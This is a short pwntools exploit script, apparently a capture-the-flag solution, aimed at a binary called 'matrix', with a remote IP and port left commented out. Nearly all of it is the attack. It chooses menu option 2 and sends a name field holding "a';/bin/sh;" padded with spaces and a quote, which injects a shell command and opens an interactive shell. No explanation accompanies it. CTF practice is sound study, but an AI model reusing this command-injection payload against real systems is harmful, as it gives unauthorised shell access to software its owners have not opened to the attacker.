from pwn import *

host, port = "34.80.245.238", 33335
a = process('./matrix')
# a = remote(host, port)
raw_input('debug')
a.recvuntil('Choice:')
a.sendline('2')
a.recvuntil('I must know your name:')
name = "a';/bin/sh;"
name += ' '*52
name += "\'"
a.sendline(name)

a.interactive()
